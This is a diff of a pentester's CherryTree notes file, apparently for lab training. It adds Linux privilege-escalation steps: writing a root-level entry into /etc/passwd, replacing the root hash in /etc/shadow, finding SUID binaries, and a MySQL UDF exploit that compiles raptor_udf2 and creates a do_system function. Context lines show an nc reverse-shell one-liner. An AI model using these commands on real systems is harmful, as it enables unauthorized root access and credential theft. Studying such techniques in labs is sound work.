@@ -278,7 +278,7 @@ Attacker:
 	</node>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="os_commands" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394169.77" ts_lastsave="1655394196.01" unique_id="14">
 		<rich_text></rich_text>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="linux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394178.07" ts_lastsave="1655394355.83" unique_id="15">
+		<node custom_icon_id="0" foreground="" is_bold="False" name="linux" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394178.07" ts_lastsave="1655818642.43" unique_id="15">
 			<rich_text>knowing filetype
 file &lt;filename&gt;
 
@@ -305,7 +305,11 @@ starting sevice
 systemctl start &lt;service_name&gt;
 
 stopping sevice
-systemctl stop &lt;service_name&gt;</rich_text>
+systemctl stop &lt;service_name&gt;
+
+find available shells
+</rich_text>
+			<rich_text family="monospace">cat /etc/shells</rich_text>
 			<node custom_icon_id="0" foreground="" is_bold="False" name="text_processing" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394284.9" ts_lastsave="1655481308.89" unique_id="21">
 				<rich_text foreground="#d4d4d4">default
 cat &lt;file&gt; | grep &lt;search&gt;</rich_text>
@@ -871,7 +875,8 @@ mkfifo /tmp/f; nc -lvnp &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;
 		</node>
 	</node>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="post_exploit_shell" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655814635.88" ts_lastsave="1655814635.88" unique_id="51">
-		<rich_text></rich_text>
+		<rich_text>
+</rich_text>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="shell_stabilizer" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655791685.61" ts_lastsave="1655814638.98" unique_id="45">
 			<rich_text>stable shell
 technique 1:
@@ -933,7 +938,7 @@ and
 
 </rich_text>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="privesc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655817747.98" ts_lastsave="1655818033.01" unique_id="52">
+		<node custom_icon_id="0" foreground="" is_bold="False" name="privesc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655817747.98" ts_lastsave="1655877686.07" unique_id="52">
 			<rich_text>find SUID
 
 find / -perm -u=s -type f 2&gt;/dev/null
@@ -943,12 +948,651 @@ sudo -l
 
 check if /etc/passwd writeable
 ls -la /etc/passwd
-rewrite root, or add new user
+
+rewrite root with our hash password, or add new user
+</rich_text>
+			<rich_text family="monospace">openssl passwd -1 -salt [hash salt] [password to be used]</rich_text>
+			<rich_text>Example below:
+</rich_text>
+			<rich_text justification="left"></rich_text>
+			<rich_text>
+</rich_text>
+			<rich_text scale="h2">mkpasswd</rich_text>
+			<rich_text>
+mkpasswd encrypts the given password with the crypt(3) libc function using the given salt.
+The syntax is as follows:
+</rich_text>
+			<rich_text family="monospace">mkpasswd -m [encryption algorithm] -S [hash salt]</rich_text>
+			<rich_text>
+
+result to append in passwd
+hacked:$1$stef$ZYhbekI8UymZof5o8aY3A/:0:0:test:/root:/bin/bash
+
+check shadow
+</rich_text>
+			<rich_text family="monospace">cat /etc/shadow</rich_text>
+			<rich_text>
+
+writable shadow
+</rich_text>
+			<rich_text family="monospace">ls -l /etc/shadow</rich_text>
+			<rich_text>
+Generate a new password hash with a password of your choice:
+</rich_text>
+			<rich_text family="monospace">mkpasswd -m sha-512 newpasswordhere</rich_text>
+			<rich_text>
+Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
 
 check /etc/crontab
 cat /etc/crontab
 
-then change crontab shell/binary to run what we want</rich_text>
+Find all the SUID/SGID executables on the Debian VM:
+</rich_text>
+			<rich_text family="monospace">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</rich_text>
+			<rich_text>
+
+</rich_text>
+			<encoded_png char_offset="263">iVBORw0KGgoAAAANSUhEUgAAAjUAAAA/CAIAAACXc66AAAAAA3NCSVQICAjb4U/gAAAgAElEQVR4nO2dd1wUx/vHny1XOPodHVTErkiMwV4SFWOJid3YsVcsSTRqLFiiidGoMVjjT2Mltli/GuwdUIKIgALmQKXXo12/nd8fRzngbu84EDWZ94s/9HZn9pmy++wzMzsfwsvBEwBspDRgMBgMBvPOQAIAettGYDAYDAZTBRIAiLdtBAaDwWAwVcDxEwaDwWDeRci3bQAGg8FgMHp4n/wTAUB6FXJ6Zlva4pAP8wbgePZbs3yanwse8cZg3gVqNP/E0EIFLVTU8BIMp2e209KUBpteN9j02mN5lm0LTQ1zKAXRcjt/ietgNcfevAwMWmhWucyEO+Cnu5nb+/Dr52pvHMJ51K7sZ49LEh+XJIYfHch72/bUCtKr98zx3Vpx37YdtcVooxBWHj5+PZs51dmqXXMzpO16zPs19O6t3NiwzNDz1zZPaGs8h3fGeMwbx/T4ieH2z3RdlenSj6nR2yXpm+syTMZ3pNQZXHWG7p3PkL5lfmtdjtMXb2uFu5nlMgeOp9/6/X/s7G8h6L/+ZejZq8t7ub33b+oo69LK7iO+7Dbjt0fqt21LLanLtqA8v1j3OPp/G33fSq822ihky7FrT6wc2LDOxiHMy5AQ9l92ck6r/FM/fDl1xrglm3aHxaUZf3mtZ+P1NqWwy+h5h07+mRQdkRd5/tpmnZibdhm0YPXl6+Ued1w3p/f+Jn970PBm10cwHA8VADARdhnBFkj39565LsNkKN5O+pgm3KUWvXMcCeeMc7x/78gdv93a3zb4559aMXttZJ7Gxq2JDyc96/0vLirOiX+aQzh/pHjfy1I39pN23n3mz561oE8jLpl5pU6yrDnvSaOQXq1bcFMurAoKiSh3S8y7M+lgsCk5ngO+ndsu8/ie6T9L7Tw+/mqx/1FuVqsF5/MQgAYA8u7t++HnJO2hhYeUGW2+uy5/W4V4v6n8ekfL+UNyhe0ZSoBARagzuCXHnArTCdI32328THsK0SnboxMAAKHh5Cx2lTKgDUGsOqosrQkk4ckirApCBGoAvamgSJC10kEjVNkOkqF4u4xdNmoAAL5onlLgW2RxgScl5Q4bsgQUR7LZpTAd8YZkOH2i1tx3TD9Z6t4QpeKOTm0gQhoVqMNE2SEWSEEAbTgVLbccKbFspOaJEAAgCU92XZgXRiMDFpaWy5gZQNr33hYcOJy5Osd//bls448BumHHTzzQza1Bv9+XMgDw7Okd05qIcu68aHnA1J4tHZi0yBvnf9z8+7UMNQCQ9n7rfvYf3LqJhz2XKUmLvHE88Kdj97PKzWs/+5vJ4z9u21wI6bF3d2/csuPvfARA2ndevGbuhI4NXK2tCEX28weX1mzYFZKmfc0m7bwHBy6eMORDD3uKURRmxZ1bP+DHcLmRQwAkkDV8prAaTwgHLb+w0q+llYCCAnHktc3rfv0jQcqYZyHd5dc7Wzy2Dhx2Mr+skQjhoO2x6zPGdVh/QwkcT7/Vq+aM9XUTlGQ8SbPgQlrNSlIFutnM1fN6Jp+cMUe0ckffWmWlhSHtfAwVmaWiDDYKr8PSqENfNqQBYNLt55MAACD3wOT+AffY41+DNc+eoaF+WD0VUkUt6z/l11dst5J51zLTeMNNqUo+OrTXcVBra+xhZsvO5/1at6HP31UBoIyLv2y/CAAEQHh4ScfPD3u7NaPh6fs+uvB20PVPjOVIibCTBooE0n+UXC5Fuyg1UgAAyOPJognSSc5zYVA2X55OVko1JkvYSQVFAukrJc9VIRgg5/Kd08/xtKkYD6mlEMpTcYssNQCMV6GA4hRetgahQjQuV9BQAwAEqSKsEZSYYLQNUmdwaRcl1TvHxYSoi9dMyRMCyuYrNUqei9xyZLYmw0WSTLCWyxicpj49G9nYoi5dG1Hnso33Pk1+TqaS6DVpat+ovSFppk52EVbtvj/yy3RZSOCSoESmxZivZ506YvP5kC13iwEsHH07Ny/cu2pEWD7t4jt9wfxz+5yHjt1ytxiA33blwd0z5adWLN31WObUbeJX6/atLRo4/2A6AovGvf2aF+5dtbA01aQD2/K7jz4iZgBonyVbl3+Rsm/R9DtiFWVt38hL9aq0YCyHzIPFeEBFMdfWrLhSnCOR2rWdMn/Rzp3yhH6/RGjMs7A4J4f8yN2ZgnzG3rMRmZ6Uq7Z3sqJTXmUzQNp32XJsw/CUv9Yv/vEfC/d+Q2f51qZQAKCO3zhy8EaE6LYLV9YyKy1clpo3XFGGUTzdM/Cz0x9N2/pb14dTpx+K0QCAKjvF2LCa4Zpny9BwP9SfKsPIe5551zLTePamVJc1AsH1aOCAklNSq1QhxWnQbeSMLpBw+tEz7JzMRMc/0UrLRmoAkP7PThteEDyEFAQAMGKbHDHD7Z/p3J8BsXWuzkgd6VVs46uEIkHBTpFUoWQcS5xnFNO+RYILPKnYJkfM8EcoLLtrNDG2uRVehOF7KgFIVT7YTswVNFGrX/MIkZI2bW6d0HCke10kyaVRHa2NukxIVXTUUZKMLKekCX1UFh8oC5J5LOUyPsagiDg0ew3Tm7i/+2+d3senvYehlo1BnQHxdzTPkjheg5mWfPTkLJOafX7Fxq4nlk05fW3483uXdh48fOh+urF+SzgNnDnN48XGz9fueKEGCLvxkmpybvrXAw7cO5mvPSMp4da1MAXAw2tx6rvnJn894MC9kxKnL2bManT/616bgvMQQFxUAtXhzoYxfi5HD6czlVI9esxtG7OmUw/no+J0BLTITYSKbj669TAuFwGAToTHcqgW6DM+HwGoksOuJGtPSVhMdBy1o10XdyLilVkWapIT0smJTrY0WA/98Y8dvCDfKcH2Dg2I1IJUDdV46MTR9rFrRwfueIUA4GZh5zEdnUwwnABAhJWVdenMgqqwSOeFA5kxpmY4Q9aaVyWHXRFrO2vlimJBnp8kLhRJ1EhV8EqcnGDiYiUWMwxmSDgb7odq88ww71rmGA8ApjQlx2tY4MquL7eN+zOZqTBGOOjHuE2fWtOajHu/DAl6jt2Tueg8htXc/Ac8ABCMTnNfniXqJxWYsMaM8lDQFIC11HbJa9dVme6zi2kKCIGKsGZrWcoGISlHQSmJBmqUzc/72bngRY0nEZkoa5nS+LWqoEqjAIASMEbPNAbKC/1j+/rgv3Mrrk55fgo+zQguTQg8iA/H0mOXo87ehDWFcooBQB1zbFFbP/8pO29lNxmyZf/ZiB+Nro+gvX2ac9Ie3kwq7eFqceT9FNrnw+bVfbla/PBW6SHa26c5j9tt191wSexDSezD/PCNw6xIlwa21csgyUkrRkInSwAAkN9Zs/4vNHpPzPX/2x0wakBzQUXvYDlUF+gYDwCknffIXYcPx4SFZYZeebSqE4fh8rnmWoiUKa8LbB2cBUTH/h1IskOnHs6CZk1sU5ITChHp6dWckxYVmlpTj4KA7rL9yt30yLvpkVdfnfmqB6eWFWA4Q7aaJ+28R+46qq+i6hxzOoDp/bD2sF7rTfVe2nvsDxdXt3mwbOGGaKnOEwXl39r08YiZwxfvj/KcF3LMlEWJGL3oVhypuiNKTSm26CS1basQDJAL/AjODg9JsnHPgbL5uWesdX9RFRhJheQMAHAogDy+Apj6asA3OvVKAACSvGCuHwFOA8qzpzaQQo9Oa8NQAABNZvSJoOgTu/cMWhZ0cNzy7y4+CLj3Jha202TaxSmztOMVpagK0tVGKkAlPr3yoxtH+3zRd8KgqUfnzgjbvWTCdq0DZjlUx5BuQ34/uqRt5L5vF6x9lk+5d5l76GthLSxUJiS8Rl08P/isec/ooE0ls4d094xyVSddyzTzMwctmsSg6TODS51B6rPaL9EymKHBIrNWVJ1jXgcw2A/fACzXehO9167HvHUnplntD5gSeLtqiVBxTnxsTnzsw5upNlGH/Gd2DjY2vYfRS6X5J1qoArFNidimJFg7q6S06iIvSNaOepU92OxUABZQNvqnSeGpNTKOUMPVcAviKe3vYHQtlIwm+CQAqDRACeU8sNE9yBQDEqo4jTTANiHEcLoWWXCByabUBQTQJqaqjv5ymWAGIezy5fjexP3df5R1dKRJPg/JAECCIlUdEwwxpfP92vEbnbTq9L+OhySMnezuKiCAZY2VOiY6QTW8Y6/GdMQLNQDQXu27eaij9yYoqi2H5ni0au/OJB56pS5N1cbbIv3P6Bo7Pyb/+dWDz68e3NlkSlDY4oCxZyqmrFkOIaVCpmIEluzFMYiO8cBp2akzN/7n9XtOv0AA8I9tlpxT6bFbUwslSfE5Xt5zRzUN//OrYKrjtM9nuNi/uhxfhEBTpXprQk58XA5QAABQN08etgz1lstoRbE0ikKhICytbCjtejNTYal5fRnWqh+yYN61amg8O4Rw0Io9M7wOTR6/IiL/DbykYbTQUP6go5U2AVmW1oQ6g6tUaniuGgCQ5VWMwKqTeAAqooXEfblcI0e0HZUb6CAVWxXGFgp9VDazU621CxBESHraVTuDZQBSmUoRvioBjyt7Tlr4yIXfZBKistPVXGkcZdldIxiezu3GJURVewyiVFbjsrkaJc+FAQDZdaHChFQs6C+X0Qx5vhN3Bfo3Rf1sEgcviaj8RKlSdK1/d+sXONkpOvTpP+lKwkLUbcJnLeXPj4VLWDs3yrq0Z9/0PUu2rJLuuJTItBjz9XSf1JOfX85Hpc1GdR45cwZ6mKx2HzRnfqe0K+POZqgBZZ7fGTT+t7l7drodPXEqooC0tm7irj538GYa+53Ebz93RXfV/bCYjGIZIerW1o2Wi3OKjR0CAACmSPwsi/IfOX1y2q00R08i7s/LCUYf23qNB0Ic9QR9Mm7ayJj9j18C5d7aia+qlYWqFwnxyhG9vS9PmKtKps/cWb55OP/W9hQ1AGRd2rNv+q7lu3+ifwt59DJd2NqJlhmzurRlAECfZ2KAcvVsYskVOPB5QIpcGrduDjniF1lqYw8xQxkaLhfDUlFaWww2iibhabJiVq9FsyPI8HzaxYT2MtIB9GdoZj80Qs2vZZbxAEDaeza119eU9AeLF3zMu7Dt/CuHVs0dAABAJct9mZSLCMe+sz5zyXoVn54PNo1afTlzsGvquVOROHgyj0rfP5VE03RLhueipAGQhCe9bVUQIig/lYm3y7olF3XUUI5yQkqg17aENYICsmS/m7Jnrn1XBU+k4AEgCQ+MxU8oxkY6KNOquzzrrGMeZAtbKQFAlaYNU0j5WVEeR2LbVkU3UGikhPo1T/mao81Q8ZwLzZSWdgoegPo1T3lflBdGG03FjqFyGclQ9SL6zstCRyb0wUuTnCFpZePUcujmLxc48ClCXZAcE/7Twm272KeyAVBx1IrxCyTLAxZsDHJgsp8/+L8R3/9+t+LWYpRW3nPWjPe0LBBHnp2zZNv/ihAAgPzpOv/pqfNmTP0ycPQ8LlOS/fzBsXtHII31NiEtuFY2HSYEjvaw5zIlxWkvwn9auO1kHmI/VIo6duf3vzdfPWrT3lHKzKf711wMSVAbm+PTb7wq+dS02Q7rA0bvPLXInmIUhUWp0bcTCsy3kCmKDU1EnpEXrxcBA3cOXUod4PV3uKS8er9NXTph2jeBS2xJRV7Rq9jzxh0rWyVSrUf/fGu2F58CAGi49cQYk1ZvG87PcLlYKqoUw42iuLNt2rE1348LPDWHK0s13l5GO4D+DM3qh0ap6bXMNB6oNhP1NyXp1Kq9O+3iuejKyPI85Fe+GzjsZD5tiTx6fjq39WwPe1KRl/X0/v+N2Hz4ltH1Wxj9EF4OngjAVkpXG4N6ozDaL4pQuGNRJLekbHm2Ou/93h/HFLgDfrr+O391o/m1/WSPdBtz+drCnEU9x12qxeDJW/ocsmbGayP82nTOir5drZdXqQHtQ7o2dVKf91H1SwMWJKg73mJTYgAqzz/VZ0uQirMumfJMh545Np2QdvYJxdul7voX7x/xbvKufKvPSu07BdLzr1JI1v/W6lr1Dr576hZcn28Z7fjeW2kGUvmXa/pNRLgX8fgcAFBlkP+F7qC8/G0P57dtBAaDwbzz6I7vvTUbAAAA4Wgag8FgMOW8Cx+OoWr/wGAwGMx/nfdi+gGDwWAw/zmwfzIEv+20Vd9O6aYnwCSsfEYF6D/EAmnvt37/gfUf//tXKGIwGExdQKJq6yPME3g1I9Wb0NysM3VaUug9cvTwPrZU9UOETZupc/QfYsPC0bdza0/LWlv2bmKOEOp7BNVkyvH8B+s+szZ+KgaDqSPISrvkGBN41a8Kaq4sbB1rbhoyg+M55U6p1nX5X/hfE1xpaPfD1buZ278QlltLcAf8dF1yfWmtt/usIYTrnOCIooQK83LOj/cqC205nn1X7TiSEPVQEns18vCSsaW7W1JtFxzPf6BjKt3l1wfhDxa2NNsvGK4o4wUw1Ch08xmhOnkWx20dY8IWcQaKbBg+a1MakzQlHIedffJQEntgXkMDHZduOmKgV96ti9eLjBuPwWDqCN1diNgEXg2rgta3LKw+zU1WM1QpZ/w/u2tR9pRtPWnzbwPy/nc7Ww1Z+4JfTA8YOq7BBe1OXKTroJn9rMI2HwxVVbvsGwVlHFo85paA/HzDwSXFBwZvCsmUFSQx5eX6YVTKvm9nbhCr3EYELNu5i84YsP6Gsu6tMFxRRjHQKADAE1hA1LZpG46ma/8vTS+unrwyZhRZ/pStKQlglTSlvD7v/cHjoE0lc8cMa7Frmx41BNrr4yFtCi5vi8IqqBhMPaITP5UKvP4e9Pv9qKhnT+9cPxv0V9m9qpWSlJ2dMefIP5UfQGypgLTzHrr14J9J0Q8lsWGZoedvLu2kHXnjdVj67FnE7emNeJ6Tbj/XvlxfC+pe+mgk7dvP/V47WHQr5sS6gI/sCQOpiuNK33nZzFDnJ4kT4xIS4xIS/7Htt3iQdcia73a9UgNoxCf2Bsu9F87qyAcAoNqPn/Jx/pkfT5fvRkz1XhScFB2RF3n5QdC8fm66gQTRfvKvUQ/LX/ArZpUMGV8Jwq7HvAM5kcdX+WgjA1SckhiXmPYqFwDSY+OSE8Slm07SzT4Z4JF5ase+0+FxjyOvrd11IdnNp7uRGIkQDtqY8ez4Kp+y0/jloRXtPbbUtoi967b+fCQh6lbMiXn9tJGmwYoCAKCcOy/ZfiQhKiIv8vy1zdP8XEozZ2kUAKAcrW2RJOZpabZxCan5ZW7GUIasRSaEg1bcD7+VG1sltGJtSpRx8Zft64NDroXfPXX6p+9vM7bebs3Kq5BuOmJg6/Czh/fdfuI6sF87PaO2VKsBfVrm3/zz4ZvYaR6DwRiCBABC+wVShcCrW7U5fHX8xpGD/RYdPpdd9QhbKq1sJXNl0fRJvSZMH7li78EHurKVo/xPpipTz0wYOPTDfkM/7Oe/8mGFDuby5q9/WzrHb8Lq3Wk+6/atnehK6E3VftCKIxnIiBllEFbtVm/wd7i47utzpR4IFUds/TlM8Nn8eU2BdBu8YpwgZNvBexWbZalehu2ZPmPO2LUX0tuMC94w2qtimInkFsfsDJw/auHue1ZDdu5c8ZlWWs6w8TrY9QjYemayYPukWesqycboQZPxKlnp0KP7ByICACiPth94yBL+TmIPaVB+eHiY0rPrB47ahzDdrFMP+6LIiCQ1kA3adWjxT/CQUWsfNOz3ZYO7U8etvWEzceOkFpV8b7WK0sr4LvYU/7IkYPSS06/bTD11ZH4PK2BvFADCUuDEV+UrRO723MpDaoYzZC2yVjH228/Hj/8kQFvz09tTpjQlAABQnAY9R87oAgk3KiRNaa++w5o/OXcHZd3864lz14Ftqvl+uvWwPl55t649eAMxKwaDMYzOzYjYBV4NSEmypapHzU0jxgMAweu+8PtZnL/G/3BLZ/tklfhc0LYx+xbNH5lR4t81dn/n87qpyH/uaQVe/04Utg1bXKYzCwCgCTu5Z+9lBQDcTOS2uLRw3pCdIYczRMaEawEajtiwaW+H1199NvdwutToOCjKvvD12g9PB+661y3kr1eefbtxt0/acsnYLAjKuXo87Nsdffo0PHpEzFCNOnzgIQu9/EQBwAVQqQpfPIq9ZxVdONYuPTbuLjeiYKxncxvieemGmXoqik3GF7EokBK0HQ+SC7vtOz+Uiwqe37u8ZfO2YwkKIxmyFtmgtK6RpjQkaUq1GtC/cczekHxAEHolbtmMQU03RFca4qNb9RnaLOvUWjy4h8HUM5Xmnc0QeGVNVa+am0aM5/nO/nUcdXrzlktFlZ2COv7nNceTP/lu1+CSoB9PivWHM5qUZB2d2cqoUp5FppLNWjWkjRuP/Fb+tmdwfuDUrw6mG4mcSiEs3d2c7TLuHTqVmMMnuPyGA0e3qxqPVQcVh1x4pPiwz2ceBICgY6emmnuPQitN/CClgWhAX0XVQMa3shkq8Z/zuvToJ2z9kceoXx84Dtm586tPBMYyZCuyYWldYG9KA5KmdOthfUT3z9zNRwAoK+RqjHu3KkN8VLsBfo0y7158ggf3MJh6ptr6ck1m9Img1QP6DR9/JKXBkOXfdTPpex0DqVTi0ys/+nj8xINRgo+nHj13/uKCj0TGHR5Npl2cMmRUx8+1fyM+6j9y6B4jQ1pGjOe3W71hnPWZn1b9T4+YmDrm4LZQhfLh0aCntX8GsRuPkm6euJXVZtnm+T2sTFrjyPOdtXeO5c453/5w/ND6uePbTj/OH7r8u27lnp7i6M8G5d86e0XTeswwN3tux/4d6Ad375oko8ZaUeZQqtzISGJOL95wPNndb0R7I+sBWYqsVYz9VH0/cMGEXv7zvznwVFm5W7A0JSrOiY99+NfZnWO//bOgrf/MzjQA0F5d+jfj910Tkh/7UBIb+vc37Swad+zVWKdO6bbD+zq/vHLzUT0vmcFgMFXWl1egFXhFlu6ughpIV+tLxeQ/v3rw14kjB3bYlNhhVsDYBhX5VchW6mQRE52gcmvjbZGeIE4u/0vKrYnnqGoG1XbmslmW91ZsvqVfGK12T+JSTdvHCQrjxpP/3Ns5evLSUzZfnjn2lQkuirBr3MJRJo7LLH0MK54+fSKzbtrYlgQmKz1Pbd+0jUtZZOHk2dyOyUwtlS1Hxff2/Zne8rPh7T7t9QmEnbheRQhRdX2Fn8OM83mVfjVUUdpydezVuGwJQ0WRzYMlQ5Yil0rr7l6/53R4YlzC8ztxWfIqXwLUrCmpRt27NBXvH+5X/j7xzf5XTft0cSl3obwP+w/xyAq58jce3MNg6h2tfi4BYEzg1ZCUJFuqetTcZDGDdBu8borXy+M/PHNu2lqrdQkqWW56zXxeNRo3/8QvL5928Z2+wL914vGhl/MRgAnG81TJN77yXwYHfzy+P7vf2MNP1QBAWHk0bSggG4oAil3btPbMlBUkivMRoNyo0ESLySuXPWV+f/wSrHtNnDNI8OLH0Aw1oJzbV+8rv1u4Zmba7jtilduIgJm+KOLre+V+SBF25PijsZN/WWTBv7cpxIRwiKWiWGR82eD7jJr2gSZOqyXqO33Bl56p5xZGlgvX6s/QcJFZpXUNQzn3nTFAn6Qp4dqvr3fhk92305LL3E9u6Es0vk8HmyNaz83r2K+7S+aVk4+x/ikGU//QFeN7rAKvhqUkDaeqT81Nw2YQjt37duPSgskH7k8uP12deCCg84ZwM1+KZdkRYQmDRweems1lStIib2wf/NPx+1q/a5rxmswbX8/f2uLswsPfJ3ReGi4nXCZuCt74EUUSADDrr25TZM9+7TjkiJgBdcKBUbN46wOmHj3nxEUFyTHhm2du2/oCAYAm8+ykcdQPS8Zs/m2KPSVNib0bOHHLoXSdtR8vT2+7OOno54pjJ66xy8gDgJGKMiLjqx/SQtC4+acTxuvREmXRBWYpsnHFWP1m6Jc0Je27fNpaHf2nbhQofRj+jAno1c/+QnAeAn77UQOdX14MiTJJIRmDwdQtRGMHTwTITloxTmJA4NWI+EWdycLWjjdmRp3rzDIAQAAJAMhI3dIAuu6t/GQCgCJAzZKSajJlX9jwqAFf/FL1s9m3hYkSKoaKrDdDeFM73/N6r3we5H1g9Li10Th+wmDqH5oAKLvJ2fmPi1/U+Ua6Ws+khb1uqzwbdeVI9Dsnwsrjg6bWcseOI1bPbHD8m6//fkecE5jciwwV2ewMzYHTvfcn9unnL8Vi54TBvBX0xE+Y9x1ejxXHzo5vpEx7un/NxsDbejbswRiH3+XXG9s+OuHfU9+ORxgM5s2D/dO/G5rgqZCC/M+HvxgM5v3D0PpyzL8DDXZOGAzmPUVnfTnmXwj2TBgM5n1Fjz7hOwsBQHoVcnpmW9q+HwZjMBgMxmxoExf8AgAAQwtVAKDOq5FGOcPpmWvfVcETIQBAEl7RKVFBfA21ZwEAANFye3+JlRWn8BWAsY9eamShWeUyk3dkIT4Gg8G849CmOydu/0zn/ioU7pgaXIOAi/TNdRkmIzQcVRoJAFSF8jpD+uY6+Cl4IgRyC8UjQd55wdtYJ2VmucyB4+m3etWcsb4WAv76l6Hzoi/+4r/ByL4YGAwG81/FbDFwE2E4HioAYCLsMoItkO7vPXNdhslQvJ30MU24Sy165zgSzhnneP/ep3V9Cw1jMBjMe03l9eW0nD8kV9ieoQQIVIQ6g1tyzKkwnSB9s93Hy6qm1HByFrtKGdCGIFYdVZbWBJLwZBFWBSECNYDeVFAkyFrpoBEq7JZm8pPsMnbZqAEAGNG8DIETNzfQQUrKHTZkCSiOZLNLYTriDclw+kStue+YftIC0XLhyixLW1BkkDwR0qhAHSbKDrFACgJotlSWIyWWjdTlA4yy68K8MBoZsLC0XCxmaM8j7XtvCw4czlyd47/+XLZxP0M3n3H33FTxN70mXDJNWQODwWD+0+jGT4zlSImwkwaKBNJ/lFwuRbsoNVoB0jyeLJogneQ8FwZl8+XpZOA7Y6QAAATwSURBVKVUY7KEnVRQJJC+UvJcFYIBci7fOf0cT5uK8ZBaCqE8FbfIUgPAeBUKKE7hZWsQKkTjcgUNNQBAkCrCGkGJCUbbIHUGl3ZRUr1zXEyIunjNlDwhoGy+UqPkucgtR2ZrMlwkyQRruYzBaerTs5GNLerStRF1Ltv4yGSFwm/U3pA0LCaEwWAw7Oj4J1pp2UgNANL/2WnDC4KHkIIAAEZskyPWztMwILbO1RmpI72KbXyVUCQo2CmSKpSMY4nzjGLat0hwgScV2+SIGf4IhWV3jSbGNrfCizB8TyUAqcoH24m5giZq9WseIVLSpq1OIDQc6V4XSXJpVEf7Fllc4ElNSFV01FGSjCynpAl9VBYfKAuSeSzlMr6fkSLi0Ow1TG/i/u6/dZwTn/Yehlo2BnUGxN/RPEvieA1mWvLRk7NMqlGFXwwGg8FUoOOf1Nz8BzyXYTLB6DSLPnxZhJU8zKLE2Hs+5aGgKQBrqe0SablKLCFQEdYICgx+VkXZICTlKCilRQM1yubn/exET0kRtamZ6UyUtWyUTCAwNerSokqjwIehBLUfYkN5oX9sD630E+X5Kfg0IwCA6wEfjqU/BARAaJKYnGIAQh1zbFHb6z7DRw6bPHTIlv3D559ZOnAZXh+BwWAwetEd3yNVd0SpKcUWnaS2bRWCAXKBH8HZ4SFJNv71Lsrm556x1v1FZdg5lSaRMwDAoQDy+Apg3vQ6jTLqfJtXXQgAQJIXzPUjwGlAefbUBlLo0WltGApQqvAbfWL3nkHLgg6OW/7dxQcB9/BYHwaDwVSn0vwTLVSB2KZEbFMSrJ1VUlp1kRcka0e9yp7sdioACygb/dOk8NQaGUeo4Wq42q+aCB4Co99UyWiCTwKASgOUUM4DG92DTDEgoYrTSANsE0IMp2uRBReYbEpdQABtYqrq6C+XCWYQwi5fju9N3N/9x9+5pSrmmuTzkAwAJChS1THBEFMuhFHlMzOtwu/Yye6uAgIUOILCYDCYalSaf7IJyLK0JtQZXKVSw3PVAIAsD5U/PNVJPAAV0ULivlyukSPajsoNdJCKrQpjC4U+KpvZqdbaBQgiJD3tqp3BMgCpTKUIX5WAx5U9Jy185MJvMglR2elqrjSOsuyuEQxP53bjEqKq2hCIUlmNy+ZqlDwXBgBk14UKE1KxoL9cRjPk+U7cFejfFPWzSRy8JKLyRFKVomv9O6s8MQaDwWAqU2lcrSSaplsyPBclDYAkPOltq4IQQflRJt4u65Zc1FFDOcoJKYFe2xLWCArIkv1uytIdIhQ8ACThgbH4CcXYSAdlWnWXZ511zINsYSslAGg/4AUg5WdFeRyJbVsV3UChkRLq1zzla442Q8VzLjRTWtopeADq1zzlfVFeGG00FTuGymUkQ9WL6DsvCx2Z0AcvTXKGrPLEGAwGg6kC0djBkwHGXso1Wdu0TmC0XxShcMeiSG5J2fLs+tlh6O2C9zfCYDAYU9CNn+rzVZ5UnHXJlGc69Myx6YS0s08o3i511794/wgMBoPB1ADd+OltXJ6HCPciHp8DAKoM8r8QP2EwGAzGFOprXbcBkIJAYlsZAACq3wFGDAaDwbzTvAv6hKjaPzAYDAbzX4eE90efEIPBYDD/Hd7ofgoYDAaDwZgJ9k8YDAaDeRch4e3PP2EwGAwGUxUcP2EwGAzmXeT/AbgiZf+3U6yeAAAAAElFTkSuQmCC</encoded_png>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="mysql_service_as_root" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655871902.33" ts_lastsave="1655877768.84" unique_id="53">
+				<rich_text>             The MySQL service is running as root and the &quot;root&quot; user for the service does not have a password assigned. We can use a </rich_text>
+				<rich_text link="webs https://www.exploit-db.com/exploits/1518">popular exploit</rich_text>
+				<rich_text> that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.
+Change into the /home/user/tools/mysql-udf directory:
+</rich_text>
+				<rich_text family="monospace">cd /home/user/tools/mysql-udf</rich_text>
+				<rich_text>
+Compile the raptor_udf2.c exploit code using the following commands:
+</rich_text>
+				<rich_text family="monospace">gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+</rich_text>
+				<rich_text>
+Connect to the MySQL service as the root user with a blank password:
+</rich_text>
+				<rich_text family="monospace">mysql -u root</rich_text>
+				<rich_text>
+
+Execute  the following commands on the MySQL shell to create a User Defined  Function (UDF) &quot;do_system&quot; using our compiled exploit:
+</rich_text>
+				<rich_text family="monospace" foreground="#00ff00">use mysql;</rich_text>
+				<rich_text family="monospace">
+</rich_text>
+				<rich_text family="monospace" foreground="#00ff00">create table foo(line blob);</rich_text>
+				<rich_text family="monospace">
+</rich_text>
+				<rich_text family="monospace" foreground="#00ff00">insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));</rich_text>
+				<rich_text family="monospace">
+</rich_text>
+				<rich_text family="monospace" foreground="#00ff00">select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';</rich_text>
+				<rich_text family="monospace">
+</rich_text>
+				<rich_text family="monospace" foreground="#00ff00">create function do_system returns integer soname 'raptor_udf2.so';</rich_text>
+				<rich_text>
+
